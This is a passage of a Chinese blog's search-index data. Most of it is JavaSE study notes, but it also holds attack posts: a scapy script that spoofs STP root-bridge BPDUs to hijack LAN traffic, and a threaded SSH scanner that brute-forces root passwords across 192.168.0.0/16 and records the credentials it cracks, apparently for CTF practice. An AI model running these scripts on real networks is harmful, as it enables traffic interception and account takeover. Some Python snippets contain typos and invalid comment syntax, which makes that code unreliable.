把字符串转换成字节数组，这是一个编码的过程：把我们看的懂的编码成计算机看得懂的 .toCharArray() 转换成字符数组 String.valueOf（） 把字符数组转换为字符串，传入一个字符数组，返回一个字符串 注意： 1、传入的数组类型可以是任意类型，并且底层还是由String的构造方法来解码的。 2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法 .toLowerCase() 把字符串转换为小写 .toUpperase() 把字符串转换为大写 ps：String中字符的转换都是按照unicode码表来转换的 String的其他功能 .repleace(被替换的字符串，要替换成的字符串) 字符或字符串替换，不存在则不改变 .trim() 去除首尾空格 .compareTo() 按照字典顺序比较两个字符串","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"String类","slug":"String类","permalink":"http://liuhaoan.github.io/tags/String类/"}]},{"title":"javaSE复习之——Object类","slug":"javaSE复习之——Object类","date":"2019-04-09T07:19:43.000Z","updated":"2019-04-09T07:40:26.878Z","comments":true,"path":"2019/04/09/javaSE复习之——Object类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Object类/","excerpt":"Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。","text":"Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。 重写toString代码示例：123public Stirng toString() &#123; return name + \",\" + age;&#125; equals方法 equals方法默认是比较地址值，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象没有重写equals，那么调用它是无意义的。 重写equals代码演示：12345//重写equals方法public boolean equals(Object obj) &#123; Student s = (Student)obj; return this.name.equals(s.name) &amp;&amp;this.age == s.age; //这里的equals调用的是string里的方法&#125; ==号和equsls的区别（面试可能问道）： 1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是 数据值，比较引用数据类型比较的是地址的值 2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没 有意义，但是我们可以重写它使其有意义。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Object类","slug":"Object类","permalink":"http://liuhaoan.github.io/tags/Object类/"}]},{"title":"javaSE复习之——Idea常用快捷键","slug":"javaSE复习之——Idea常用快捷键","date":"2019-04-09T07:14:05.000Z","updated":"2019-04-09T07:19:06.850Z","comments":true,"path":"2019/04/09/javaSE复习之——Idea常用快捷键/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Idea常用快捷键/","excerpt":"暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示","text":"暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示 ctrl+Y 删除光标所在行 ctrl+D 复制光标所在行，并且粘贴在它的下面 ctrl+alt+L 格式化代码 ctrl+/ 单行注释 Ctrl+shift+/ 选中行注释，多行注释 alt+ins 自动生成代码，get、set等 alt+shift+上下箭 移动当前代码行","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"idea快捷键","slug":"idea快捷键","permalink":"http://liuhaoan.github.io/tags/idea快捷键/"}]},{"title":"javaSE复习之——Eclipse常用快捷键","slug":"javaSE复习之——Eclipse常用快捷键","date":"2019-04-09T07:00:39.000Z","updated":"2019-04-09T07:31:25.025Z","comments":true,"path":"2019/04/09/javaSE复习之——Eclipse常用快捷键/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/javaSE复习之——Eclipse常用快捷键/","excerpt":"常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建","text":"常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建ctrl + shift + f 格式化代码，使代码更简洁 ctrl + / 注释 也可以ctrl + shift + /或\\ F3或ctrl + 鼠标点击 查看源码 ctrl + 1 给建议 alt + shift + m 抽取一段代码成方法，省去了复制 alt + shift + r 改名，在改变量是非常好用 shift + alt + s 生成toString Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定) Ctrl+D: 删除当前行 Ctrl+Alt+↓ 复制当前行到下一行(复制增加) Ctrl+Alt+↑ 复制当前行到上一行(复制增加) Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) Alt+↑ 当前行和上面一行交互位置(同上)","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Eclipse快捷键","slug":"Eclipse快捷键","permalink":"http://liuhaoan.github.io/tags/Eclipse快捷键/"}]},{"title":"网络攻防之——Python实现生成树协议(STP)欺骗攻击","slug":"网络攻防之——Python实现生成树协议欺骗攻击","date":"2019-04-09T02:09:48.000Z","updated":"2019-04-09T06:54:07.448Z","comments":true,"path":"2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/","link":"","permalink":"http://liuhaoan.github.io/2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/","excerpt":"何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例","text":"何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例 12345678910111213#!/usr/bin/pythonfrom scapy.all import *//01:80:c2:00:00:00这个是一个组播地址eth = Dot3(dst=\"01:80:c2:00:00:00\", src=\"自己的MAC地址\")llc = LLC()stp = STP(rootid=0, rootmac=\"自己的MAC地址\", bridgeid=0, bridgemac=\"自己的MAC地址\")pkt=sendp(eth/llc/stp,inter=2,loop=1)","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://liuhaoan.github.io/tags/Python/"},{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/tags/网络攻防/"},{"name":"生成树协议欺骗","slug":"生成树协议欺骗","permalink":"http://liuhaoan.github.io/tags/生成树协议欺骗/"}]},{"title":"javaSE复习之——面向对象_内部类","slug":"javaSE复习之——面向对象-内部类","date":"2019-04-08T05:22:50.000Z","updated":"2019-04-08T11:51:45.602Z","comments":true,"path":"2019/04/08/javaSE复习之——面向对象-内部类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/javaSE复习之——面向对象-内部类/","excerpt":"内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在","text":"内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在 内部类的分类成员内部类 它定义在一个类的内部 局部内部类 它定义在一个方法或者一个作用域内部，它的访问仅限于方法内或者该作用域内 注意事项： 局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的 匿名内部类 匿名内部类应该是平时我们编写代码时用得最多的，在编写事件监听的代码时使用匿名内部类不但方便，而且使代码更加容易维护 例如：为按钮设置一个监听器12345678new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 静态内部类 它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static 内部类的面试题之 —— 内部类能不能访问外部类成员变量？ 答（成员内部类）： 内部类可以访问外部类的成员变量，因为编译器底层在创建成员内部类时，为成员内部类加上了指向外部类的引用 示例： 12外部类.this.成员变量外部类.this.成员方法 ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了 例子： 1234567891011121314151617181920class Circle &#123; private double radius = 0; public Circle(double radius) &#123; this.radius = radius; getDrawInstance().drawSahpe(); //必须先创建成员内部类的对象，再进行访问 &#125; private Draw getDrawInstance() &#123; return new Draw(); &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 &#125; &#125;&#125; 匿名内部类访问外部类成员底层实现原理： 我们用一段代码来举例：1234567891011121314public class Test &#123; public static void main(String[] args) &#123; &#125; public void test() &#123; final int a = 10; new Thread()&#123; public void run() &#123; System.out.println(a); &#125;; &#125;.start(); &#125;&#125; 当test方法调用，系统会给内部类自动加上构造器（这也就是为什么匿名内部类不能有构造方法的原因），这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。这样就解决了生命周期的问题 但是还有一个数据不一致的问题，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。 数据不一致问题的解决方法就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因 在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用final修饰 jdk8新特性 局部内部类与匿名内部类访问外部类成员变量，外部类那个变量不需要final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。 匿名内部类 格式： 12345//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法new 类名或者抽象类名() &#123; &#125;.方法名（）//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法 解释： 可以吧new 到 } 的代码看作创建的一个子类对象实例，所以后面可以.方法名调用 好处： 可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。 注意事项： 1、匿名内部类只针对重写一个方法使用，如果要一次性重写多个方法的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则重新定义类。 2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。 3、匿名内部类中不能定义构造函数。 4、使用匿名内部类时，我们必须是继承一个类或者实现一个接口，但是两者不可兼得，只能继承一个类或者实现一个接口。 5、匿名内部类中不能存在任何的静态成员变量和静态方法。 6、匿名内部类属于局部内部类，所以局部内部类所有限制都在匿名内部类上生效 7、匿名内部类不能是抽象的，它必须实现继承的类或者接口中的抽象方法 链式编程： 特点： 调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"内部类","slug":"内部类","permalink":"http://liuhaoan.github.io/tags/内部类/"},{"name":"匿名内部类","slug":"匿名内部类","permalink":"http://liuhaoan.github.io/tags/匿名内部类/"},{"name":"链式编程","slug":"链式编程","permalink":"http://liuhaoan.github.io/tags/链式编程/"}]},{"title":"网络攻防之——Python实现MD5加密","slug":"网络攻防之——Python实现MD5加密","date":"2019-04-08T02:27:04.000Z","updated":"2019-04-08T11:47:03.871Z","comments":true,"path":"2019/04/08/网络攻防之——Python实现MD5加密/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现MD5加密/","excerpt":"代码示例","text":"代码示例 123456789101112#!/usr/bin/python3import hashilbstr = input(“请输入要解密的字符串：”)md5 = hashlib.md5()//创建MD5加密对象md5.update(str.encode(\"utf-8\"))//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密print(md5.hexdigest())//获取MD5加密后的16进制输出打印","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"MD5加密","slug":"MD5加密","permalink":"http://liuhaoan.github.io/tags/MD5加密/"},{"name":"Python","slug":"Python","permalink":"http://liuhaoan.github.io/tags/Python/"}]},{"title":"网络攻防之——Python实现ssh端口扫描并爆破","slug":"网络攻防之——Python实现ssh端口扫描并爆破","date":"2019-04-08T02:23:38.000Z","updated":"2019-04-09T02:02:24.884Z","comments":true,"path":"2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/","excerpt":"实现步骤 1、循环遍历出所有网段ip2、利用多线程多并发同时探测22端口3、把探测出来的存活机进行密码爆破4、爆破成功则去拿到主机文件并保存ip、密码等信息5、爆破不成功则记录该ip，进行后续操作。 代码示例","text":"实现步骤 1、循环遍历出所有网段ip2、利用多线程多并发同时探测22端口3、把探测出来的存活机进行密码爆破4、爆破成功则去拿到主机文件并保存ip、密码等信息5、爆破不成功则记录该ip，进行后续操作。 代码示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python3import threadingimport pexpectfrom socket import *key = [pexpect.TIMEOUT, \"#\", \"\\$\", \"&gt;\", \"&gt;&gt;&gt;\", \"&amp;\"]loginKey = [pexpect.TIMEOUT, \"[p|P]assword\", \"yes\"]def getFlag(p, ret): p.sendline(\"cat ../../../../flag\") p.expect(key) ret += \" flag:\\n\" + str(p.before) print(ret) file = open(\"flag.txt\", \"a+\") file.write(ret) file.close()def getPass(ip, passwd): p = pexpect.spawn(\"ssh root@\" + ip, timeout=1) try: b = p.expect(loginKey) if b == 1: p.sendline(passwd) b = p.expect(key) if b &gt; 0: getFlag(p, ip + \" passwd:\" + passwd) return 1 except: pass finally: p.close() return 0def scan(ip): s = socket(AF_INET, SOCK_STREAM) s.settimeout(1) try: s.connect((ip, 22)) b = True for n in open(\"passwd\"): passwd = n.strip(); if getPass(ip, passwd) == 1: b = False break if b: file = open(\"ip.txt\", \"a+\") file.write(ip + \"\\n\") file.close() except: pass finally: s.close()for n in range(1, 255): for nn in range(1, 255): ip = \"192.168.\" + str(n) + \".\" + str(nn) while True: if len(threading.enumerate()) &lt; 255: break threading.Thread(target=scan, args=(ip,)).start()","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/tags/网络攻防/"},{"name":"python","slug":"python","permalink":"http://liuhaoan.github.io/tags/python/"},{"name":"ssh","slug":"ssh","permalink":"http://liuhaoan.github.io/tags/ssh/"},{"name":"爆破","slug":"爆破","permalink":"http://liuhaoan.github.io/tags/爆破/"},{"name":"端口扫描","slug":"端口扫描","permalink":"http://liuhaoan.github.io/tags/端口扫描/"}]},{"title":"javaSE复习之——面向对象_包与权限修饰符","slug":"javaSE复习之——面向对象-包与权限修饰符","date":"2019-04-07T09:55:53.000Z","updated":"2019-04-08T11:49:47.182Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-包与权限修饰符/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-包与权限修饰符/","excerpt":"包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。","text":"包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。 定义包的格式12package 包名;多级包用“.”分开 例子： 1package java.util.Scanner; 在这里当然也可以把Scanner用*代替，*就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为需要遍历该包所有类。 ps：在开发中一般都不使用，而是导入具体的类。 定义时的注意事项 1、必须是程序的第一条可执行语句2、package在一个java文件中只能有一个3、包名的格式为域名倒写 例：com.aikan0.add这个add就是这个包的作用。 生成包命令1javac -d . 源文件名 ps：了解一下就好了 面试题——package、import、class有没有顺序关系？ 解答： 有，并且package &gt; import &gt; class 权限修饰符 四种权限修饰符 本类 同一个包下(子类和无关类) 不同包下(子类) 不同包下(无关类) private Y 默认 Y Y protected Y Y Y public Y Y Y Y ps：protected表示受保护的，就是保护权限只给给自己的子类，一般不用在变量，而是用在成员变量或者成员方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"包","slug":"包","permalink":"http://liuhaoan.github.io/tags/包/"},{"name":"权限修饰符","slug":"权限修饰符","permalink":"http://liuhaoan.github.io/tags/权限修饰符/"}]},{"title":"javaSE复习之——面向对象_接口","slug":"javaSE复习之——面向对象-接口","date":"2019-04-07T09:22:46.000Z","updated":"2019-04-08T11:50:50.335Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-接口/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-接口/","excerpt":"接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口","text":"接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口 特点： a : 接口用关键字interface表示 1interface 接口名 &#123;&#125; b : 类实现接口用implements表示 1class 类名 implements 接口名 &#123;&#125; c : 接口不能实例化 那么，接口如何实例化呢? 答：按照多态的方式来实例化。 d : 接口的子类 a : 可以是抽象类。但是意义不大。b : 可以是具体类。要重写接口中的所有抽象方法。(推荐方案) 注意事项： 1、接口中的成员变量默认都是常量，他会自动加public static final关键字，并且可以互相交换位置，新手平时都手动给出。 2、接口中没有构造方法 3、接口是干爹，不是亲爹，子类不能用super访问父类中的内容，子类默认继承object类 4、接口中不能定义非抽象方法 5、类与接口是实现关系而非继承关系（干爹） 6、同一个类可以实现多个接口 例子：1class Deom implements InterA,InterB &#123;&#125; 8、接口不能实现接口（implements），但是却可以继承（extends） 类 与 接口的关系 a : 类与类： 继承关系,只能单继承,可以多层继承。 b : 类与接口： 实现关系,可以单实现,也可以多实现。并且还可以在继承一个类的同时实现多个接口。 c : 接口与接口： 继承关系,可以单继承,也可以多继承。 抽象类 与 接口的区别： 抽象类： 和普通的类差不多，只是可以定义抽象方法而已 接口： 成员变量：只可以常量成员方法：只可以抽象 设计理念区别（重要）： 抽象类： 定义的是该继承体系的共性功能 例：每个学生都需要学习 接口： 定义的是该继承体系的扩展性功能 例：每个学生在学校的学习方式都不一样，这样就需要扩展 设计理念区别： 接口是对动作的抽象，抽象类是对根源的抽象。 抽象类表示的是：这个对象是什么。 接口表示的是：这个对象能做什么。 比如：男人，女人，这两个类，他们的抽象类是人。说明：他们都是人，他们的根源就是人 又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。说明：他们都可以吃东西，他们的根源是不同的，但是做的动作却相同的。 结论 在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。 当关注一个事物的本质的时候，用抽象类； 当关注一个要做的动作的时候，用接口。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"接口","slug":"接口","permalink":"http://liuhaoan.github.io/tags/接口/"}]},{"title":"javaSE复习之——面向对象_抽象类","slug":"javaSE复习之——面向对象-抽象类","date":"2019-04-07T09:04:40.000Z","updated":"2019-04-08T11:50:10.066Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-抽象类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-抽象类/","excerpt":"抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写","text":"抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写 抽象类的几个问题： 1、为什么不直接定义空方法？ 解答：抽象类可以正确的引导使用者正确使用它们，减少被误用 2、抽象类有什么作用？ 解答：增强程序的扩展性和兼容性，规范编程 抽象类中的面试题： 1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化） 2、abstract不能和static共存 原因：static让这个方法是静态方法，而静态方法可以用类名.方法名调用，而静态方法可以类名.方法名调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而abstract不能和static共存。 3、abstract不能和final共存 原因：abstract强制子类重写，而final表示最终的，它不让子类重写，这里形成了冲突。 4、abstract不能和private共存 原因：abstract强制子类重写，而private让子类访问不到，所以它们两个修饰符形成了冲突。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"抽象类","slug":"抽象类","permalink":"http://liuhaoan.github.io/tags/抽象类/"}]},{"title":"javaSE复习之——面向对象_多态","slug":"javaSE复习之——面向对象-多态","date":"2019-04-07T07:58:33.000Z","updated":"2019-04-08T11:50:27.981Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-多态/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-多态/","excerpt":"多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi();","text":"多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi(); 成员变量 编译、运行看左边(父类) 也就是创建对象后，子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)，父类引用对象就优先调用父类（编译运行看左边） 解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是父类那么这个引用指向super区域，否则指向this区域 成员方法 编译看左边(父类)、运行看右边(子类)。动态绑定 ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。 静态成员方法 与成员变量同理，编译、运行看左边(父类)，所以多态中静态方法不存在重写 多态的弊端 父类引用不能使用子类特有的属性和行为，但是能通过1zi b = (zi)a; //强转类型 多态的好处 1、提高了代码的维护性(继承保证) 2、提高了代码的扩展性(由多态保证) 多态的使用 1、开发是很少在创建对象的时候使用多态，而是直接创建子类引用子类对象 2、在需要使用方法使代码简洁时，当做参数使用多态效果最好，因为扩展性强 比如：现有三个类“动物”“狗”“猫”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用方法函数来使代码简洁，在调用这个方法时可以创建好一个 狗 或 猫 的对象然后传给参数，这就需要使用到多态了，如果不使多态那么就需要给狗和猫分别创建一个函数。 不过在方法中使用多态还有一个问题：狗 和 猫 都有各自特有的功能与属性，如果调用猫的功能，但是传入的对象是狗，那么就出错了。 解决方法：关键字 instanceof ps：了解一下，开发中用到的不多，一般都用到方法重写 代码实例：12对象变量A instanceof 对象变量B//如果是相同的类返回true 多态中的代码分析123456789101112131415161718192021222324252627282930class A &#123; public void show() &#123; show2(); //这里调用的是子类中的show方法 &#125; public void show2() &#123; System.out.println(\"我\"); &#125;&#125;class B extends A &#123; public void show2() &#123; System.out.println(\"爱\"); &#125;&#125;class C extends B &#123; public void show() &#123; super.show(); &#125; public void show2() &#123; System.out.println(\"你\"); &#125;&#125;public class Test2DuoTai &#123; public static void main(String[] args) &#123; A a = new B(); a.show();//返回一个爱 B b = new C(); b.show(); &#125;&#125; 得出结果： 在多态中，父类中的方法调用另一个方法，且被调用的方法都存在于子类与父类中的情况下，优先调用子类的方法，也就是父类方法成为了一个跳板，跳转到了子类的方法中 还是那句话： 成员方法编译看左边(父类)、运行看右边(子类) 成员变量编译看左边(父类)、运行看左边(父类)","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"多态","slug":"多态","permalink":"http://liuhaoan.github.io/tags/多态/"}]},{"title":"javaSE复习之——面向对象_代码块与继承","slug":"javaSE复习之——面向对象-代码块与继承","date":"2019-04-06T02:08:03.000Z","updated":"2019-04-08T11:50:22.436Z","comments":true,"path":"2019/04/06/javaSE复习之——面向对象-代码块与继承/","link":"","permalink":"http://liuhaoan.github.io/2019/04/06/javaSE复习之——面向对象-代码块与继承/","excerpt":"一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{}","text":"一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{} 如何创建一个静态方法？ 在方法中加static修饰，那么这个方法是静态方法（函数） 在载入类的时候就这个方法就已经在类的静态区创建，不需要创建对象即可调用 静态变量 在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。 比如 第一条命令给这个变量赋值“张三” 第二条命令又给这个变量赋值“李四” 那么之后调用这个变量时，这个变量返回“李四” 二、构造方法 与 代码块构造方法 构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果 系统会自动创建空参构造，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出 代码块局部代码块 它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率 构造代码块 (初始化块) 构造代码块可以在一个类中执行，执行完就弹栈， 例： 1class Deom&#123; &#123;这就是构造代码块&#125; &#125; ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行 构造代码块可以把一些初始化的代码放在其中，每次调用构造都执行，并且在构造方法之前执行 ps：实际上构造方法开发中用到的不多，但是面试可能会问 构造代码块可以做的功能： 我们可以做诸如统计创建对象的次数等功能。 静态代码块 例： 1static &#123;&#125; 作用： 用于给类进行初始化，在加载的时候就执行，并且只执行一次。 一般用于加载驱动，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。 比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。 注意事项： 1、静态代码块不能访问普通变量 2、静态代码块在 类 中，优先于主方法（面试题） 3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块 类的继承 ps：继承与升级一般都用作系统升级 父类 &gt; 子类 继承的定义 class 子类(当前类) extends 父类(继承的类) ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法 继承的好处： 1、可以提升代码的复用性，不需要打太多重复的代码 2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错 3、是多态的前提 继承的弊端： 1、耦合性非常强，父类有的一些属性可能是子类不需要的 开发原则： 高内聚、低耦合 耦合：类与类的关系 内聚：自己完成某件事的能力 在java中继承的特点： 1、Java只支持单继承不支持多继承（一个孩子只能有一个爹） 2、可以多层继承（继承体系），也就是可以继承爷爷 3、想看这个体系所有功能就看最底层类，也就是儿子类 4、想看这个体系共性功能就要看顶层类，也就是爷爷类 注意事项 1、子类只能继承父类所有非私有的成员（方法和变量） 2、子类不能继承父类的构造方法，因为构造方法必须和类名一样，而继承是不一样的，但可以通过super关键字去访问父类的构造方法 3、不要为了部分功能而去继承，因为继承体现的是一种关系，就算有相同属性也不一定继承。 比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。 4、子父类如果出现相同变量那么会采取就近原则，但是在真正的项目开发中不会出现这种情况，因为没有意义 5、子类无论如何都会访问父类中的构造方法 6、在全是静态方法的类中，构造方法必须私有化，这样防止别人创建这个类的对象 this和super this： 代表当前对象的引用，如果继承了父类，那么也可以引用父类 super： 代表对父类的引用 一些使用实例： this.成员变量名 调用本类成员变量，也可以调用父类的，但是采用就近原则 super.成员变量名 调用父类的成员变量 ps：成员变量名可以是方法名 调用父类中的构造方法: 1super(...); 调用本类中的构造方法: 1this(...); ps：一个方法里只能调用其中的一个 注意事项 类中的构造方法系统都自带super()；但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以super（参数1，参数2....）；也可以用this调用本类的有参构造，进而间接调用父类有参构造 构造方法的调用都是从上到下，即从父类调用到子类，可以理解为一个队列 继承中的面试 1、假设有 子类方法、子类、父类 且其中都有一个num的变量，那么：num用方法中的变量，this.num调用本类中的变量，super.num调用父类中的变量 2、在继承中不要忘记了每个构造方法都会有一个super（）；访问父类 3、override 